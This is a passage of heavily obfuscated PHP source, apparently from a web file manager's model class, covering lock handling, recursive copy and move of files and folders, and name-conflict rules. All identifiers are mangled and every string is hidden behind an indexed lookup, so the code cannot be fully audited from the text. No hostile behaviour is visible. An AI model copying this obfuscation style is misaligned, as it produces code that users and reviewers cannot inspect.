$this->_lockCheckEnd($´‡Š–íø[546], $…«öàÂ¡); } public function lockCopyEnd($­‹Ş›±) { $â±¥˜º =& $_SERVER[şÒÁøÒÄ]; if (!$this->allowLock()) { return; } $ï–ã­ = 0; $this->_lockEvent($­‹Ş›±, array($â±¥˜º[547], $â±¥˜º[548]), $ï–ã­); $this->_lockParent($­‹Ş›±, array($â±¥˜º[548]), $ï–ã­); $this->_lockEvent($­‹Ş›±, array($â±¥˜º[549], $â±¥˜º[550]), $ï–ã­); } public function lockWriteStart($æ”³ôÏ, $Ì¡ œıë = '') { $êüÛÅä× =& $_SERVER[şÒÁøÒÄ]; if (!$this->allowLock()) { return; } $this->_lockCheck($êüÛÅä×[547], $æ”³ôÏ); $·ä¤Ï¦ = 1; $this->_lockKey($êüÛÅä×[551] . $æ”³ôÏ . $êüÛÅä×[10] . $Ì¡ œıë, $·ä¤Ï¦); $this->_lockEvent($æ”³ôÏ, array($êüÛÅä×[546], $êüÛÅä×[548]), $·ä¤Ï¦); $this->_lockParent($æ”³ôÏ, array($êüÛÅä×[546], $êüÛÅä×[548]), $·ä¤Ï¦); $this->_lockCheckEnd($êüÛÅä×[547], $æ”³ôÏ); } public function lockWriteEnd($ÓÆ³ÌÚ×, $ö©Ä’¤¾ = '') { $«ÍÅÂü½ =& $_SERVER[şÒÁøÒÄ]; if (!$this->allowLock()) { return; } $€è»‰´ô = 0; $this->_lockKey($«ÍÅÂü½[551] . $ÓÆ³ÌÚ× . $«ÍÅÂü½[10] . $ö©Ä’¤¾, $€è»‰´ô); $this->_lockEvent($ÓÆ³ÌÚ×, array($«ÍÅÂü½[546], $«ÍÅÂü½[548]), $€è»‰´ô); $this->_lockParent($ÓÆ³ÌÚ×, array($«ÍÅÂü½[546], $«ÍÅÂü½[548]), $€è»‰´ô); } public function lockMoveStart($¸“›îØÙ) { $ºêÛÕƒ§ =& $_SERVER[şÒÁøÒÄ]; if (!$this->allowLock()) { return; } $this->_lockCheck($ºêÛÕƒ§[548], $¸“›îØÙ); $«µÚ¡ÃË = 1; $this->_lockKey($ºêÛÕƒ§[552] . $¸“›îØÙ, $«µÚ¡ÃË); $this->_lockEvent($¸“›îØÙ, array($ºêÛÕƒ§[546], $ºêÛÕƒ§[547]), $«µÚ¡ÃË); $this->_lockParent($¸“›îØÙ, array($ºêÛÕƒ§[546], $ºêÛÕƒ§[548]), $«µÚ¡ÃË); $this->_lockEvent($¸“›îØÙ, array($ºêÛÕƒ§[553], $ºêÛÕƒ§[549], $ºêÛÕƒ§[550]), $«µÚ¡ÃË); $this->_lockCheckEnd($ºêÛÕƒ§[548], $¸“›îØÙ); } public function lockMoveEnd($ˆù·×¸Ê) { $Å­æ•ã =& $_SERVER[şÒÁøÒÄ]; if (!$this->allowLock()) { return; } $Öª”¥Í = 0; $this->_lockKey($Å­æ•ã[552] . $ˆù·×¸Ê, $Öª”¥Í); $this->_lockEvent($ˆù·×¸Ê, array($Å­æ•ã[546], $Å­æ•ã[547]), $Öª”¥Í); $this->_lockParent($ˆù·×¸Ê, array($Å­æ•ã[546], $Å­æ•ã[548]), $Öª”¥Í); $this->_lockEvent($ˆù·×¸Ê, array($Å­æ•ã[553], $Å­æ•ã[549], $Å­æ•ã[550]), $Öª”¥Í); } private function _lockCheck($ÓÒÀûÃÃ, $æïç¼•) { $ç¤ß¶ğ« =& $_SERVER[şÒÁøÒÄ]; $÷”µ³ù› = $this->sourceInfo($æïç¼•); $óÖ°°ä§ = $ÓÒÀûÃÃ . $ç¤ß¶ğ«[10] . $æïç¼•; $this->_lockTimeStart[$óÖ°°ä§] = timeFloat(); if (!is_array($÷”µ³ù›)) { return; } $ÊÄ©ÍıÅ = LNG($ç¤ß¶ğ«[554]); CacheLock::setErrorMsg($ç¤ß¶ğ«[162] . htmlspecialchars($÷”µ³ù›[$ç¤ß¶ğ«[32]]) . $ç¤ß¶ğ«[164] . $ÊÄ©ÍıÅ); $this->_lockKey($óÖ°°ä§, 1); $this->_lockKey($óÖ°°ä§, 0); $ßŠ£Ğ†± = array_reverse($this->parentLevelArray($÷”µ³ù›[$ç¤ß¶ğ«[511]])); foreach ($ßŠ£Ğ†± as $‚êóÀô¿) { $óÖ°°ä§ = $ÓÒÀûÃÃ . $ç¤ß¶ğ«[555] . $‚êóÀô¿; if (CacheLock::lockGet($ç¤ß¶ğ«[556] . $óÖ°°ä§)) { $÷”µ³ù› = $this->sourceInfo($‚êóÀô¿); CacheLock::setErrorMsg($ç¤ß¶ğ«[162] . htmlspecialchars($÷”µ³ù›[$ç¤ß¶ğ«[32]]) . $ç¤ß¶ğ«[164] . $ÊÄ©ÍıÅ); $this->_lockKey($óÖ°°ä§, 1); $this->_lockKey($óÖ°°ä§, 0); } } } private function _lockCheckEnd($õŞç½ŠÑ, $Ğ¥ˆªù°) { $âÏ™§É… =& $_SERVER[şÒÁøÒÄ]; $é•ñï‡ö = $õŞç½ŠÑ . $âÏ™§É…[10] . $Ğ¥ˆªù°; CacheLock::setErrorMsg($âÏ™§É…[378]); if (!isset($this->_lockTimeStart[$é•ñï‡ö])) { return; } $¬æÙ‹¾ø = timeFloat() - $this->_lockTimeStart[$é•ñï‡ö]; unset($this->_lockTimeStart[$é•ñï‡ö]); if ($¬æÙ‹¾ø > 0.5) { unset(self::$cacheSourceInfo[$âÏ™§É…[460] . $Ğ¥ˆªù°]); } $…­Ş–°˜ = $this->sourceInfo($Ğ¥ˆªù°); if (!$…­Ş–°˜) { show_json(LNG($âÏ™§É…[105]), !1); } } private function _lockParent($£“›ÁÄÇ, $ûúÀãßó, $ñêª¡ÈÕ) { if (!$this->autoLockSet) { return; } $·¨”¾Œ˜ = $this->sourceInfo($£“›ÁÄÇ); if (!is_array($·¨”¾Œ˜)) { return; } $­Ñ¯€… = array_reverse($this->parentLevelArray($·¨”¾Œ˜[$_SERVER[şÒÁøÒÄ][511]])); foreach ($­Ñ¯€… as $‹³¦ñÕ·) { $this->_lockEvent($‹³¦ñÕ·, $ûúÀãßó, $ñêª¡ÈÕ); } } private function _lockEvent($Âä­ı‡, $äÍŒï½Ñ, $ñÍùÖô) { $èÄğÀ =& $_SERVER[şÒÁøÒÄ]; if (!$this->autoLockSet) { return; } foreach ($äÍŒï½Ñ as $éë°Ê‰) { $ï…í†ÄÒ = $éë°Ê‰ . $èÄğÀ[10] . $Âä­ı‡; if ($ñÍùÖô && CacheLock::lockGet($èÄğÀ[556] . $ï…í†ÄÒ)) { continue; } $this->_lockKey($ï…í†ÄÒ, $ñÍùÖô); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($İ›ÄõÈú, $Ñ í©Å‰ = 1) { $÷§ãµåï = $_SERVER[şÒÁøÒÄ][556] . md5($İ›ÄõÈú); if ($Ñ í©Å‰) { if (isset(self::$_lockItemArr[$÷§ãµåï])) { return; } self::$_lockItemArr[$÷§ãµåï] = 1; CacheLock::lock($÷§ãµåï, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$÷§ãµåï])) { return; } unset(self::$_lockItemArr[$÷§ãµåï]); CacheLock::unlock($÷§ãµåï); } } public function isParentOf($İŸ¨Ë¿, $¯Ò¼éÊê) { $ïñ°²ª¾ =& $_SERVER[şÒÁøÒÄ]; $ì†ó±½» = $this->sourceInfo($İŸ¨Ë¿); $£Ş×ÏÊ· = $this->sourceInfo($¯Ò¼éÊê); $³€®ë‰œ = $ì†ó±½»[$ïñ°²ª¾[511]] . $ì†ó±½»[$ïñ°²ª¾[402]] . $ïñ°²ª¾[50]; $»‹¬ˆ™ã = $£Ş×ÏÊ·[$ïñ°²ª¾[511]] . $£Ş×ÏÊ·[$ïñ°²ª¾[402]] . $ïñ°²ª¾[50]; $°ì¿ù©Ö = strpos($»‹¬ˆ™ã, $³€®ë‰œ) === 0; return $°ì¿ù©Ö; } private $targetIsDelete = 0; public function copy($˜ëÍ“ñ, $Ü•±Øß, $‚ñãõ¹Ô = REPEAT_REPLACE, $¿‹¿Ëéö = '') { $âô®Ôà­ =& $_SERVER[şÒÁøÒÄ]; $àıéÙˆÓ = $this->sourceInfo($˜ëÍ“ñ); $çñ‘©¸… = $this->sourceInfo($Ü•±Øß); if (!$àıéÙˆÓ || !$çñ‘©¸… || $çñ‘©¸…[$âô®Ôà­[410]] != $âô®Ôà­[88]) { return !1; } if ($this->isParentOf($˜ëÍ“ñ, $Ü•±Øß)) { return !1; } $Úª¢£‘Ä = $¿‹¿Ëéö ? $¿‹¿Ëéö : $àıéÙˆÓ[$âô®Ôà­[32]]; $this->lockCopyStart($˜ëÍ“ñ); $this->lockWriteStart($Ü•±Øß, $Úª¢£‘Ä); $¹ü©È÷Ü = array($âô®Ôà­[557] => array(), $âô®Ôà­[558] => array(), $âô®Ôà­[559] => array()); $this->targetIsDelete = intval($àıéÙˆÓ[$âô®Ôà­[431]]); $Ñ™†óş³ = $this->fileNameExistCache($Ü•±Øß, $àıéÙˆÓ[$âô®Ôà­[32]]); $öÑ»ñŠî = $this->_copy($˜ëÍ“ñ, $Ü•±Øß, $‚ñãõ¹Ô, $¹ü©È÷Ü, !0, $¿‹¿Ëéö); $this->_childrenListClear(); $this->lockCopyEnd($˜ëÍ“ñ); $this->lockWriteEnd($Ü•±Øß, $Úª¢£‘Ä); if ($àıéÙˆÓ[$âô®Ôà­[410]] == $âô®Ôà­[88] && $Ñ™†óş³ == $öÑ»ñŠî) { $this->folderSizeResetChildren($Ñ™†óş³); } Model($âô®Ôà­[560])->addAll($¹ü©È÷Ü[$âô®Ôà­[558]], array(), !0); if ($Ñ™†óş³ != $öÑ»ñŠî || $àıéÙˆÓ[$âô®Ôà­[410]] == $âô®Ôà­[88]) { Model($âô®Ôà­[561])->eventCopy($öÑ»ñŠî); } $this->saveAll($¹ü©È÷Ü[$âô®Ôà­[559]]); Model($âô®Ôà­[200])->linkAdd($¹ü©È÷Ü[$âô®Ôà­[557]]); $this->folderSizeReset($Ü•±Øß); $this->updateModifyTime($Ü•±Øß); return $öÑ»ñŠî; } private function _copy($¼ªËÍ±, $Å‹Ü¥², $€–º‘–Å, &$ÍÀö„«š, $ßÎÏ´ã´, $ÀÙªÁà˜ = '') { $¥¨—»è =& $_SERVER[şÒÁøÒÄ]; $¤°Œ›‘™ = $this->sourceInfoCache($¼ªËÍ±); $Æ½°Ÿ÷Ô = $¤°Œ›‘™[$¥¨—»è[410]] == $¥¨—»è[88]; $çò¤Ë©Ú = $ÀÙªÁà˜ ? $ÀÙªÁà˜ : $¤°Œ›‘™[$¥¨—»è[32]]; $ô‘­ìæ = $this->fileNameExistCache($Å‹Ü¥², $çò¤Ë©Ú); if ($ßÎÏ´ã´) { $this->_childrenAllMake($¼ªËÍ±); if ($Æ½°Ÿ÷Ô && $ô‘­ìæ) { $this->_childrenAllMake($ô‘­ìæ); } } if (!$ô‘­ìæ) { return $this->_copyCreate($¼ªËÍ±, $Å‹Ü¥², $çò¤Ë©Ú, $ÍÀö„«š); } $®€Í±× = $ô‘­ìæ; if ($Æ½°Ÿ÷Ô) { if ($€–º‘–Å == REPEAT_RENAME_FOLDER) { $çò¤Ë©Ú = $this->fileNameAutoCache($Å‹Ü¥², $çò¤Ë©Ú, $€–º‘–Å, $Æ½°Ÿ÷Ô); $®€Í±× = $this->_copyCreate($¼ªËÍ±, $Å‹Ü¥², $çò¤Ë©Ú, $ÍÀö„«š); } else { $ÖÜ÷ = $this->_childrenList($¼ªËÍ±); foreach ($ÖÜ÷ as $„ğ»ÓÎ‹) { $this->_copy($„ğ»ÓÎ‹[$¥¨—»è[402]], $ô‘­ìæ, $€–º‘–Å, $ÍÀö„«š, !1); } } } else { if ($€–º‘–Å == REPEAT_RENAME || $€–º‘–Å == REPEAT_RENAME_FOLDER) { $çò¤Ë©Ú = $this->fileNameAutoCache($Å‹Ü¥², $çò¤Ë©Ú, $€–º‘–Å, $Æ½°Ÿ÷Ô); $®€Í±× = $this->_copyCreate($¼ªËÍ±, $Å‹Ü¥², $çò¤Ë©Ú, $ÍÀö„«š); } else { if ($€–º‘–Å == REPEAT_REPLACE) { $™ÎÔÕë® = $this->sourceInfoCache($ô‘­ìæ); $ºıÇÜ‰à = $this->fileHistory($™ÎÔÕë®, $¤°Œ›‘™[$¥¨—»è[468]], $¤°Œ›‘™[$¥¨—»è[76]]); if ($ºıÇÜ‰à) { $ÍÀö„«š[$¥¨—»è[557]][] = $¤°Œ›‘™[$¥¨—»è[468]]; } } else { if ($€–º‘–Å == REPEAT_SKIP) { } } } Hook::trigger($¥¨—»è[562], array($¥¨—»è[563], $¤°Œ›‘™, 0)); } return $®€Í±×; } private function _copyCreate($ßø¼‹ò, $Î¼Ï¿¶˜, $¶Ìëğ½¨, &$ğÚÓÀ´) { $›çÏ»Ğ™ =& $_SERVER[şÒÁøÒÄ]; $Å£Ì¬ô = $this->sourceInfoCache($ßø¼‹ò); $ß¥‚•¶Ö = $this->sourceInfoCache($Î¼Ï¿¶˜); $·Å‹ğôØ = $this->_makeItemData($Å£Ì¬ô, $ß¥‚•¶Ö, $¶Ìëğ½¨); Hook::trigger($›çÏ»Ğ™[564], $·Å‹ğôØ); Hook::trigger($›çÏ»Ğ™[565], array($›çÏ»Ğ™[566], $·Å‹ğôØ, 0)); $½°«ò‡ú = $this->add($·Å‹ğôØ); $¥ÇÍ©ÊÇ = array($›çÏ»Ğ™[402] => $½°«ò‡ú, $›çÏ»Ğ™[32] => $¶Ìëğ½¨); $this->_copyApplyMeta($¥ÇÍ©ÊÇ, $ğÚÓÀ´); if ($Å£Ì¬ô[$›çÏ»Ğ™[410]] != $›çÏ»Ğ™[88]) { $ğÚÓÀ´[$›çÏ»Ğ™[557]][] = $Å£Ì¬ô[$›çÏ»Ğ™[468]]; return $½°«ò‡ú; } $ô§§ØäØ = array(); $ùÙÅŒ° = array(); $this->_childrenListAll($ßø¼‹ò, $ô§§ØäØ); $å°åÀ½ó = count($ô§§ØäØ); if ($å°åÀ½ó == 0) { return $½°«ò‡ú; } $äĞŸ†€â = $this->sourceInfo($½°«ò‡ú); foreach ($ô§§ØäØ as $¨±ÀÔœõ) { $§¥ä“ß = $this->_makeItemData($¨±ÀÔœõ, $äĞŸ†€â, $¨±ÀÔœõ[$›çÏ»Ğ™[32]]); $§¥ä“ß[$›çÏ»Ğ™[511]] = $¨±ÀÔœõ[$›çÏ»Ğ™[511]]; $ùÙÅŒ°[] = $§¥ä“ß; } $this->chunkEventSet($›çÏ»Ğ™[567], array($›çÏ»Ğ™[568], $·Å‹ğôØ, $å°åÀ½ó)); $this->addAll($ùÙÅŒ°, array(), !1); $ğÅ¸çÁÍ = $this->where(array($›çÏ»Ğ™[432] => $½°«ò‡ú))->select(); $¥Û…ŠÊ¬ = $this->_childrenMakeRelation($ô§§ØäØ, $ğÅ¸çÁÍ); $¥Û…ŠÊ¬[$ßø¼‹ò] = $½°«ò‡ú; $¿‰©šè‰ = array(); $¸¸¥–‹ = array(); foreach ($ğÅ¸çÁÍ as $¨±ÀÔœõ) { $‘¬¥šóó = $¨±ÀÔœõ[$›çÏ»Ğ™[402]]; $±Ô‚ı±ø = $this->_childrenMatch($¥Û…ŠÊ¬, $¨±ÀÔœõ, $äĞŸ†€â); $¿‰©šè‰[] = array($›çÏ»Ğ™[402], $‘¬¥šóó, $›çÏ»Ğ™[432], $±Ô‚ı±ø[$›çÏ»Ğ™[432]]); $¸¸¥–‹[] = array($›çÏ»Ğ™[402], $‘¬¥šóó, $›çÏ»Ğ™[511], $±Ô‚ı±ø[$›çÏ»Ğ™[511]]); $this->_copyApplyMeta($¨±ÀÔœõ, $ğÚÓÀ´); if ($¨±ÀÔœõ[$›çÏ»Ğ™[410]] != $›çÏ»Ğ™[88]) { $ğÚÓÀ´[$›çÏ»Ğ™[557]][] = $¨±ÀÔœõ[$›çÏ»Ğ™[468]]; } } $this->chunkEventSet($›çÏ»Ğ™[569], array($›çÏ»Ğ™[570], $·Å‹ğôØ, $å°åÀ½ó)); $this->saveAll($¿‰©šè‰); $this->chunkEventSet($›çÏ»Ğ™[571], array($›çÏ»Ğ™[572], $·Å‹ğôØ, $å°åÀ½ó)); $this->saveAll($¸¸¥–‹); return $½°«ò‡ú; } private function _childrenMakeRelation($¸¹öñ¤İ, $‹³Ïµ†·) { $¨Âõ­òœ =& $_SERVER[şÒÁøÒÄ]; $¨¯ù€‰± = array(); $õ„ÄšÏ = array(); foreach ($¸¹öñ¤İ as $ÒÒ¿ğƒ) { $±îÍÒçÙ = $ÒÒ¿ğƒ[$¨Âõ­òœ[32]] . $¨Âõ­òœ[8] . $ÒÒ¿ğƒ[$¨Âõ­òœ[511]]; $¨¯ù€‰±[$±îÍÒçÙ] = $ÒÒ¿ğƒ[$¨Âõ­òœ[402]]; } foreach ($‹³Ïµ†· as $ÒÒ¿ğƒ) { $±îÍÒçÙ = $ÒÒ¿ğƒ[$¨Âõ­òœ[32]] . $¨Âõ­òœ[8] . $ÒÒ¿ğƒ[$¨Âõ­òœ[511]]; $ÈÆŠ—ˆ´ = $¨¯ù€‰±[$±îÍÒçÙ]; $õ„ÄšÏ[$ÈÆŠ—ˆ´] = $ÒÒ¿ğƒ[$¨Âõ­òœ[402]]; } return $õ„ÄšÏ; } private function _childrenMatch($›Éìñ¦¹, $Ğ³ëôõ, $º¬ÁÀ¡…) { $éå¬êÉ =& $_SERVER[şÒÁøÒÄ]; $…¥×â = $º¬ÁÀ¡…[$éå¬êÉ[511]]; $«€èÄÄà = $this->parentLevelArray($Ğ³ëôõ[$éå¬êÉ[511]]); foreach ($«€èÄÄà as $ÒÙˆÑµµ) { if (isset($›Éìñ¦¹[$ÒÙˆÑµµ])) { $…¥×â .= $›Éìñ¦¹[$ÒÙˆÑµµ] . $éå¬êÉ[573]; } } $…¥×â = rtrim($…¥×â, $éå¬êÉ[50]) . $éå¬êÉ[50]; $ôÕÏ®Õß = $this->parentLevelArray($…¥×â); $š˜è˜¿û = $ôÕÏ®Õß[count($ôÕÏ®Õß) - 1]; return array($éå¬êÉ[432] => $š˜è˜¿û, $éå¬êÉ[511] => $…¥×â); } private function _makeItemData($¦•ğà”Á, $Í’Øùû, $¹ñÛ¹ÆÊ) { $‡•˜²ê =& $_SERVER[şÒÁøÒÄ]; $óÜ’ùÉ„ = array($‡•˜²ê[574] => $¦•ğà”Á[$‡•˜²ê[410]], $‡•˜²ê[420] => $¹ñÛ¹ÆÊ, $‡•˜²ê[575] => $¦•ğà”Á[$‡•˜²ê[412]] ? $¦•ğà”Á[$‡•˜²ê[412]] : $‡•˜²ê[12], $‡•˜²ê[469] => $¦•ğà”Á[$‡•˜²ê[468]] ? $¦•ğà”Á[$‡•˜²ê[468]] : 0, $‡•˜²ê[545] => $¦•ğà”Á[$‡•˜²ê[76]] ? $¦•ğà”Á[$‡•˜²ê[76]] : 0, $‡•˜²ê[576] => intval($Í’Øùû[$‡•˜²ê[411]]), $‡•˜²ê[577] => intval($Í’Øùû[$‡•˜²ê[496]]), $‡•˜²ê[578] => intval(USER_ID), $‡•˜²ê[579] => intval(USER_ID), $‡•˜²ê[401] => intval($Í’Øùû[$‡•˜²ê[402]]), $‡•˜²ê[580] => $Í’Øùû[$‡•˜²ê[511]] . $Í’Øùû[$‡•˜²ê[402]] . $‡•˜²ê[50], $‡•˜²ê[424] => $¦•ğà”Á[$‡•˜²ê[85]] ? $¦•ğà”Á[$‡•˜²ê[85]] : time(), $‡•˜²ê[430] => 0, $‡•˜²ê[581] => $‡•˜²ê[12]); return $óÜ’ùÉ„; } private function _copyApplyMeta($¾üêÛêª, &$«•â¡ØÊ) { $»şƒ =& $_SERVER[şÒÁøÒÄ]; $¶Ñ¡‡–¿ = $¾üêÛêª[$»şƒ[402]]; $ÆĞ‡ŒÄì = $¾üêÛêª[$»şƒ[32]]; if (!isset($¾üêÛêª[$»şƒ[582]]) || !$¾üêÛêª[$»şƒ[582]] || $¾üêÛêª[$»şƒ[582]] == $»şƒ[198]) { $«•â¡ØÊ[$»şƒ[559]][] = array($»şƒ[402], $¶Ñ¡‡–¿, $»şƒ[582], short_id($¶Ñ¡‡–¿)); } if (Input::check($ÆĞ‡ŒÄì, $»şƒ[583])) { $«•â¡ØÊ[$»şƒ[558]][] = array($»şƒ[402] => $¶Ñ¡‡–¿, $»şƒ[94] => $»şƒ[465], $»şƒ[374] => str_replace($»şƒ[53], $»şƒ[12], Pinyin::get($ÆĞ‡ŒÄì))); $«•â¡ØÊ[$»şƒ[558]][] = array($»şƒ[402] => $¶Ñ¡‡–¿, $»şƒ[94] => $»şƒ[464], $»şƒ[374] => Pinyin::get($ÆĞ‡ŒÄì, $»şƒ[584])); } $«•â¡ØÊ[$»şƒ[558]][] = array($»şƒ[402] => $¶Ñ¡‡–¿, $»şƒ[94] => $»şƒ[444], $»şƒ[374] => KodSort::makeStr($ÆĞ‡ŒÄì)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($œ‚óÑ©¥) { $ûÚ…‡€© =& $_SERVER[şÒÁøÒÄ]; $‰æ¹ä = $this->sourceInfo($œ‚óÑ©¥); $ ƒœßÔ = $ûÚ…‡€©[585]; $Õ¼Ş¬¶Ä = array($ûÚ…‡€©[511] => array($ûÚ…‡€©[540], $‰æ¹ä[$ûÚ…‡€©[511]] . $œ‚óÑ©¥ . $ûÚ…‡€©[541]), $ûÚ…‡€©[431] => $this->targetIsDelete); $Šà­¥ì = $this->field($ ƒœßÔ)->where($Õ¼Ş¬¶Ä)->select(); if (!$Šà­¥ì) { return; } $Šà­¥ì = array_to_keyvalue($Šà­¥ì, $ûÚ…‡€©[402]); foreach ($Šà­¥ì as $ßÂˆÄèÄ) { $‡ÊÖñ²Ş = $ßÂˆÄèÄ[$ûÚ…‡€©[432]]; $œ‚óÑ©¥ = $ßÂˆÄèÄ[$ûÚ…‡€©[402]]; if (!isset($this->_childrenListCache[$œ‚óÑ©¥]) && $ßÂˆÄèÄ[$ûÚ…‡€©[410]] == $ûÚ…‡€©[88]) { $this->_childrenListCache[$œ‚óÑ©¥] = array(); } if (!isset($this->_childrenListCache[$‡ÊÖñ²Ş])) { $this->_childrenListCache[$‡ÊÖñ²Ş] = array(); } $this->_childrenListCache[$‡ÊÖñ²Ş][$œ‚óÑ©¥] = $ßÂˆÄèÄ; $this->_childrenItemCache[$œ‚óÑ©¥] = $ßÂˆÄèÄ; } } private function _childrenListAll($‹Ê’ÏÊ, &$¨ÁÇ†¥Ç) { $Û³ÀĞÄ =& $_SERVER[şÒÁøÒÄ]; if (!isset($this->_childrenListCache[$‹Ê’ÏÊ])) { return; } $·‡¢Ô¬ï = $this->_childrenListCache[$‹Ê’ÏÊ]; foreach ($·‡¢Ô¬ï as $‚µ¿¡¸é => $£…·Ä×Î) { $¨ÁÇ†¥Ç[$‚µ¿¡¸é] = $£…·Ä×Î; if ($£…·Ä×Î[$Û³ÀĞÄ[410]] == $Û³ÀĞÄ[88]) { $this->_childrenListAll($‚µ¿¡¸é, $¨ÁÇ†¥Ç); } } } private function sourceInfoCache($—¦œı®ü) { if (isset($this->_childrenItemCache[$—¦œı®ü])) { return $this->_childrenItemCache[$—¦œı®ü]; } return $this->sourceInfo($—¦œı®ü); } private function _childrenList($ÓµòÆô‰) { if (isset($this->_childrenListCache[$ÓµòÆô‰])) { return $this->_childrenListCache[$ÓµòÆô‰]; } return $this->_childrenListSelect($ÓµòÆô‰); } private function _childrenListSelect($Î±®ªÈ) { $ùø£„Á¤ =& $_SERVER[şÒÁøÒÄ]; $”Æı³»™ = array($ùø£„Á¤[432] => $Î±®ªÈ, $ùø£„Á¤[431] => $this->targetIsDelete); $ÖüÎ›Ô  = $this->where($”Æı³»™)->select(); $ÖüÎ›Ô  = $ÖüÎ›Ô  ? $ÖüÎ›Ô  : array(); $Ê¦–åş = array_to_keyvalue($ÖüÎ›Ô , $ùø£„Á¤[402]); $this->_childrenListCache[$Î±®ªÈ] = $Ê¦–åş; foreach ($Ê¦–åş as $Î±®ªÈ => $¯Ã™ ûü) { $this->_childrenItemCache[$Î±®ªÈ] = $¯Ã™ ûü; } return $Ê¦–åş; } private function fileNameExistCache($ú®ßô„, $ò­Å¦×‹) { $ÁŒ¥«¶Ë =& $_SERVER[şÒÁøÒÄ]; $ò­Å¦×‹ = strtolower($ò­Å¦×‹); $ûî‚¢…ß = $this->_childrenList($ú®ßô„); foreach ($ûî‚¢…ß as $ĞŠïòò) { if ($ò­Å¦×‹ == strtolower($ĞŠïòò[$ÁŒ¥«¶Ë[32]])) { return $ĞŠïòò[$ÁŒ¥«¶Ë[402]]; } } return !1; } private function fileNameAutoCache($Ä¦¦êú–, $–›ˆÓôµ, $¬ù¨ÏòÜ, $°ªÊ€¯) { $éÌåÒ¢£ =& $_SERVER[şÒÁøÒÄ]; $µˆ¶¨³ñ = $this->_childrenList($Ä¦¦êú–); $£¢äıºÙ = array_to_keyvalue($µˆ¶¨³ñ, $éÌåÒ¢£[12], $éÌåÒ¢£[32]); return $this->fileNameAutoGet($£¢äıºÙ, $–›ˆÓôµ, $¬ù¨ÏòÜ, $°ªÊ€¯); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($¢íåÑàÏ, $¾£™Ç»ã, $úæç¯ = REPEAT_REPLACE, $İŠõ£é¤ = '') { $íïˆ¡¨ =& $_SERVER[şÒÁøÒÄ]; $ŞáŸÔó§ = $this->sourceInfo($¢íåÑàÏ); $¢Ü®æí¬ = $this->sourceInfo($¾£™Ç»ã); if ($ŞáŸÔó§[$íïˆ¡¨[432]] == $¢Ü®æí¬[$íïˆ¡¨[402]]) { if ($ŞáŸÔó§[$íïˆ¡¨[431]] == $íïˆ¡¨[88]) { Model($íïˆ¡¨[429])->restore(array($¢íåÑàÏ)); } if (!$İŠõ£é¤ || $İŠõ£é¤ == $ŞáŸÔó§[$íïˆ¡¨[32]]) { return $¢íåÑàÏ; } } $¼şå”Îş = $this->pathInfoMore($¢íåÑàÏ); if ($this->isParentOf($¢íåÑàÏ, $¾£™Ç»ã)) { return !1; } if (!$ŞáŸÔó§ || !$¢Ü®æí¬ || $¢Ü®æí¬[$íïˆ¡¨[410]] != $íïˆ¡¨[88]) { return !1; } Hook::trigger($íïˆ¡¨[586], $¼şå”Îş); $this->targetIsDelete = intval($ŞáŸÔó§[$íïˆ¡¨[431]]); if ($ŞáŸÔó§[$íïˆ¡¨[432]] == $¾£™Ç»ã && $İŠõ£é¤ != $ŞáŸÔó§[$íïˆ¡¨[32]]) { $µà¨äİı = $this->fileNameExist($¾£™Ç»ã, $İŠõ£é¤); if ($µà¨äİı && $ŞáŸÔó§[$íïˆ¡¨[410]] == $íïˆ¡¨[198]) { $â©ö’Ñ‚ = $this->sourceInfo($µà¨äİı); $«Ã²‘üÚ = $this->fileHistory($â©ö’Ñ‚, $ŞáŸÔó§[$íïˆ¡¨[468]], $ŞáŸÔó§[$íïˆ¡¨[76]]); if (!$«Ã²‘üÚ) { Model($íïˆ¡¨[471])->remove($ŞáŸÔó§[$íïˆ¡¨[468]]); } $this->removeNow($¢íåÑàÏ, !1); $this->folderSizeReset($¾£™Ç»ã); Hook::trigger($íïˆ¡¨[587], $¼şå”Îş); return $µà¨äİı; } } $Ñ‘¢¼Š = $İŠõ£é¤ ? $İŠõ£é¤ : $ŞáŸÔó§[$íïˆ¡¨[32]]; $this->lockMoveStart($¢íåÑàÏ); $this->lockWriteStart($¾£™Ç»ã, $Ñ‘¢¼Š); $î†¤‰ó¥ = array($íïˆ¡¨[557] => array(), $íïˆ¡¨[588] => !1); $this->clearShare($¢íåÑàÏ, $¾£™Ç»ã); $¦§ŒÏıô = $this->fileNameExistCache($¾£™Ç»ã, $ŞáŸÔó§[$íïˆ¡¨[32]]); $ÇÍı¨ŞÖ = $this->_move($¢íåÑàÏ, $¾£™Ç»ã, $úæç¯, $î†¤‰ó¥, $İŠõ£é¤); $this->sourceCacheClear(); if ($ŞáŸÔó§[$íïˆ¡¨[410]] == $íïˆ¡¨[88] && $¦§ŒÏıô) { $this->folderSizeResetChildren($ÇÍı¨ŞÖ); } Model($íïˆ¡¨[200])->linkAdd($î†¤‰ó¥[$íïˆ¡¨[557]]); if ($¦§ŒÏıô && $î†¤‰ó¥[$íïˆ¡¨[588]]) { $this->removeNow($¢íåÑàÏ, !1); } $this->lockMoveEnd($¢íåÑàÏ); $this->lockWriteEnd($¾£™Ç»ã, $Ñ‘¢¼Š); $this->folderSizeReset($ŞáŸÔó§[$íïˆ¡¨[432]]); $this->folderSizeReset($¾£™Ç»ã); $ ˆ÷¤Öê = array($ŞáŸÔó§[$íïˆ¡¨[432]], $¾£™Ç»ã); if ($ŞáŸÔó§[$íïˆ¡¨[410]] == $íïˆ¡¨[88]) { $ ˆ÷¤Öê[] = $¢íåÑàÏ; } $this->updateModifyTime($ ˆ÷¤Öê); Model($íïˆ¡¨[561])->eventMove($¢íåÑàÏ, $ŞáŸÔó§[$íïˆ¡¨[432]], $¾£™Ç»ã); Hook::trigger($íïˆ¡¨[587], $¼şå”Îş); return $ÇÍı¨ŞÖ; } private function _move($˜åƒšØ, $¸Øß­³¡, $‚ş ıÚÆ, &$¦Á€×ë¢, $äàûñ—õ = '') { $³±Ä³Îó =& $_SERVER[şÒÁøÒÄ]; $¤­ª¹ß’ = $this->sourceInfo($˜åƒšØ); $ğÒ½È‘ = $¤­ª¹ß’[$³±Ä³Îó[410]] == $³±Ä³Îó[88]; $×ÉşÏå‘ = $äàûñ—õ ? $äàûñ—õ : $¤­ª¹ß’[$³±Ä³Îó[32]]; $ûíºŠ…¶ = $this->fileNameExistCache($¸Øß­³¡, $×ÉşÏå‘); 